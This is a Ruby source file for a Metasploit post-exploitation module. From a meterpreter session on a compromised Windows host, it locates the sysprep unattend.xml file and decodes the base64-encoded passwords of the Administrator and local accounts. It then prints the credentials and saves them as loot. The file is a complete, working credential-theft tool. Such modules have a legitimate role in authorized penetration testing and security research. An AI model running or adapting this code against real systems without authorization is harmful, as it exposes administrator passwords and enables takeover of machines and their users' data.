##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'rex'
require 'msf/core/post/file'
require 'rexml/document'
require 'base64'

class Metasploit3 < Msf::Post

	include Msf::Post::File

	def initialize(info={})
		super( update_info( info,
			'Name'          => 'Windows Gather unattend.xml Credentials Extraction',
			'Description'   => %q{
					This module will check the file system for a copy of
				unattend.xml then extract usernames and their corresponding
				passwords. Passwords in unattend.xml are base64 encoded. This
				module extracts and decodes these passwords then stores them	
				in loot.
			},
			'License'       => MSF_LICENSE,
			'Author'        => [ 'Sean Verity <veritysr1980[at]gmail.com>' ],
			'Platform'      => [ 'windows' ],
			'SessionTypes'  => [ 'meterpreter' ]
		))
	end

	# Convert encoded password to string, base64 decode it, present in human-readable format
	def decode(enc_pword)
		Base64.decode64(enc_pword.to_s).bytes.to_a.pack('c*').force_encoding('UTF-16LE')
	end

	def unattend_parser(unattend_file)
		print_status("Parsing unattend.xml...")
		print_status("Credentials will be in <username>:<password> format.\n")
		
		creds = Array.new

		# Dump the contents of unattend.xml into a variable then convert to an xml object
		unattend_file = session.fs.file.new(unattend_file)
			unattend_var = ""
			until unattend_file.eof?
				unattend_var << unattend_file.read
			end
		unattend_xml = REXML::Document.new unattend_var

		# Extract credentials for the built-in Administrator account
		pword_node = "unattend/settings/component/UserAccounts/AdministratorPassword/Value"
		enc_admin_pword = unattend_xml.elements[pword_node].first
		dec_admin_pword = decode(enc_admin_pword)
		admin_creds = ''
		admin_creds << "Administrator:" << dec_admin_pword.encode("ASCII-8BIT")
		creds << admin_creds
		print_good(admin_creds)

		# Extract credentials for all local accounts in unattend.xml
		# These accounts are likely members of the Administrators group
		accounts_node = "unattend/settings/component/UserAccounts/LocalAccounts"
		unattend_xml.elements.each(accounts_node) do |person|
			if person.get_text("LocalAccount/Username")
				enc_pword = person.get_text("LocalAccount/Password/Value")
				dec_pword = decode(enc_pword).encode("ASCII-8BIT")
				user_creds = ''
				user_creds << person.get_text("LocalAccount/Username").to_s
				user_creds << ':' << dec_pword
				creds << user_creds
				print_good(user_creds)
			else person.get_text("LocalAccount/Name")
				enc_pword = person.get_text("LocalAccount/Password/Value")
				dec_pword = decode(enc_pword).encode("ASCII-8BIT")
				user_creds = ''
				user_creds << person.get_text("LocalAccount/Name").to_s
				user_creds << ':' << dec_pword
				creds << user_creds
				print_good(user_creds)
			end
		end
		return creds
	end
	

	def run
		print_status("Determining if unattend.xml is present...")

		# Default location of unattend.xml
		drive = session.fs.file.expand_path("%SystemDrive%")	
		path_to_unattend = "\\Windows\\System32\\sysprep\\" 
		unattend_file = drive << path_to_unattend << 'unattend.xml'

		if session.fs.file.exists?unattend_file
			store_loot(
				'unattend.user.creds',
				'text/csv',
				session,
				unattend_parser(unattend_file),
				'unattend_creds.csv',
				'Credentials found in unattend.xml'
			)
		else
			print_error(unattend_file << " is not present in the default location.")
		end
	end
end
